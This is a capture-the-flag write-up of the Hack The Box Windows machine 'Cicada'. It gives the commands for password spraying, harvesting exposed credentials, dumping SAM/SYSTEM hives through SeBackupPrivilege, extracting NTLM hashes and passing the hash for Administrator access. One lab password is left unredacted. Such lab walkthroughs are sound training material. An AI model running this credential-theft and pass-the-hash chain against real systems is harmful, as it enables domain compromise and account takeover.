# Hack The Box - Cicada

## Machine Info

- **OS:** Windows

## Tools Used
```text
Nmap
NetExec
smbclient
LDAP
Evil-WinRM
reg save
Impacket secretsdump
Hashcat
```

---

## Enumeration

I started with a standard Nmap scan:

```bash
nmap -sS -sV -sC -O 10.129.231.149

<img width="967" height="447" alt="image" src="https://github.com/user-attachments/assets/c28094a9-5daa-497b-abc4-b7ea97d6f57d" />

```

The target was identified as a Windows Server domain controller for:

```text
cicada.htb
```

Services included:

- SMB
- LDAP
- Kerberos


Because SMB was exposed, I started with SMB enumeration.
---

## SMB Enumeration

Guest access was available through SMB.

<img width="1440" height="290" alt="image" src="https://github.com/user-attachments/assets/ed1aeb21-551f-4585-8813-16f42d448f64" />

I also found an HR-related file that contained the default employee password:

<img width="702" height="217" alt="image" src="https://github.com/user-attachments/assets/99255ace-aeaa-43c0-af82-ec001a60a21b" />

During enumeration, I identified several domain users that I could build into a user file to brute force that default password:

```text
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

<img width="1032" height="400" alt="image" src="https://github.com/user-attachments/assets/a050b9cc-5f40-485d-8ca7-58027b6d025b" />


I then tested the default password using NetExec:

```bash
nxc smb 10.129.231.149 -u cicada_users.txt -p 'REDACTED' --continue-on-success
```

The password successfully authenticated as:

```text
michael.wrightson
```

<img width="717" height="157" alt="image" src="https://github.com/user-attachments/assets/b6322079-091d-44bb-b058-0b42a65e4aed" />


One thing I had to be careful about here was SMB guest fallback. Earlier failed attempts returned:

```text
(Guest)
```

<img width="1102" height="225" alt="image" src="https://github.com/user-attachments/assets/dae9b62d-1735-4bbc-9c10-cf57972189aa" />


## Michael Wrightson

I enumerated Michael's SMB shares:

```bash
nxc smb 10.129.231.149 -u michael.wrightson -p 'REDACTED' --shares
```

Michael had read access to:

```text
HR
IPC$
NETLOGON
SYSVOL
```

The `DEV` share was visible but did not show read permissions.

I tested it directly with:

```bash
smbclient //10.129.231.149/DEV -U 'cicada.htb\michael.wrightson'
```

Attempting to list the share returned:

```text
NT_STATUS_ACCESS_DENIED
```

This confirmed that Michael could see the `DEV` share existed, but could not access its contents.

---

## LDAP Enumeration

Since Michael had valid domain credentials, I used LDAP to enumerate Active Directory users:

```bash
nxc ldap 10.129.231.149 -u michael.wrightson -p 'REDACTED' --users
```

This displayed user metadata, including the Active Directory description field.

One account stood out:

```text
david.orelious
```

His description contained:

```text
Just in case I forget my password is REDACTED
```

<img width="1112" height="235" alt="image" src="https://github.com/user-attachments/assets/87dd461a-f1a0-40a1-a128-abcad11d0035" />



Credentials recovered:

```text
Username: david.orelious
Password: REDACTED
```

Never store sensitive information in readable Active Directory metadata.

---

## David Orelious

I tested David's credentials and enumerated his SMB shares:

```bash
nxc smb 10.129.231.149 -u david.orelious -p 'REDACTED' --shares
```

David had read access to the `DEV` share:

```text
DEV    READ
```

<img width="987" height="281" alt="image" src="https://github.com/user-attachments/assets/1050d955-134a-4a22-ad17-4964899842ad" />


I connected using:

```bash
smbclient //10.129.231.149/DEV -U 'cicada.htb\david.orelious'
```

Inside the share, I found:

```text
Backup_script.ps1
```

I downloaded and reviewed the script:

```bash
cat Backup_script.ps1
```
<img width="938" height="227" alt="image" src="https://github.com/user-attachments/assets/2ae4fbe0-0ea0-4396-8bbd-4e7065d2c2be" />

The script contained credentials for another user:

```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "REDACTED" -AsPlainText -Force
```

<img width="297" height="261" alt="image" src="https://github.com/user-attachments/assets/2f14da35-392d-4e67-b55d-fdfa169389da" />


While the script converted the password into a `SecureString`, the password itself was already stored in plaintext.

Credentials recovered:

```text
Username: emily.oscars
Password: REDACTED
```

---

## Emily Oscars

I enumerated Emily's SMB access:

```bash
nxc smb 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' --shares
```

Emily had much more privileged access:

```text
ADMIN$    READ
C$        READ,WRITE
HR        READ
IPC$      READ
NETLOGON  READ
SYSVOL    READ
```

<img width="1102" height="221" alt="image" src="https://github.com/user-attachments/assets/b1ee1b60-7856-4d77-ae76-52d6d88a86dc" />


I then connected using Evil-WinRM:

```bash
evil-winrm -i 10.129.231.149 -u emily.oscars -p 'REDACTED'
```

Once connected, I checked her token privileges:

```powershell
whoami /priv
```

The important privilege was:

```text
SeBackupPrivilege    Back up files and directories    Enabled
```

<img width="953" height="287" alt="image" src="https://github.com/user-attachments/assets/7207247f-2fd1-4244-bb03-d602b0146c7a" />


This privilege is dangerous because it allows backup operations to bypass normal file permissions.

---

## Privilege Escalation

HTB provided the hint to back up the appropriate registry hives using `reg save`.

Since Emily had `SeBackupPrivilege`, I saved the SAM hive:

```powershell
reg save HKLM\SAM C:\Users\emily.oscars.CICADA\Documents\SAM.save
```

Then I saved the SYSTEM hive:

```powershell
reg save HKLM\SYSTEM C:\Users\emily.oscars.CICADA\Documents\SYSTEM.save
```

Both commands completed successfully.

I downloaded the files through Evil-WinRM:

```text
download SAM.save
download SYSTEM.save
```

Back on Kali, I verified that both files were present:

```bash
ls -lh SAM.save SYSTEM.save
```

The SAM hive contains local account password hashes, while the SYSTEM hive contains the boot key required to decrypt them.

---

## Dumping NTLM Hashes

I used Impacket's `secretsdump` to extract the hashes:

```bash
impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
```

This returned the Administrator account:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:REDACTED:::
```

<img width="410" height="132" alt="image" src="https://github.com/user-attachments/assets/65f2de33-04fa-47db-ae55-5bec5ef25119" />



I briefly attempted to crack the NTLM hash using Hashcat:

```bash
echo 'REDACTED' > admin.hash
```

Then:

```bash
hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt
```

Hashcat exhausted the full wordlist without recovering the password:

```text
Status...........: Exhausted
Recovered........: 0/1
```

At this point, cracking the plaintext password was unnecessary.

---

## Pass-the-Hash

Because NTLM authentication supports pass-the-hash, I used the Administrator hash directly with Evil-WinRM:

```bash
evil-winrm -i 10.129.231.149 -u Administrator -H REDACTED
```

Authentication succeeded and I received an Administrator shell.

<!-- SCREENSHOT: Administrator Evil-WinRM shell -->

I navigated to the Administrator desktop:

```powershell
cd C:\Users\Administrator\Desktop
```

Listed the files:

```powershell
dir
```

Then retrieved the final flag:

```powershell
type root.txt
```

---


## Key Takeaways

- SMB guest access can reveal useful domain information.
- Default employee passwords should be rotated immediately.
- Passwords should never be stored in Active Directory description fields.
- Hardcoded credentials remain exposed even if later converted to a `SecureString`.
- `SeBackupPrivilege` is highly sensitive and can allow access to protected system data.
- SAM and SYSTEM registry hives can be used to recover local account NTLM hashes.
- NTLM hashes do not always need to be cracked if pass-the-hash authentication is possible.

---



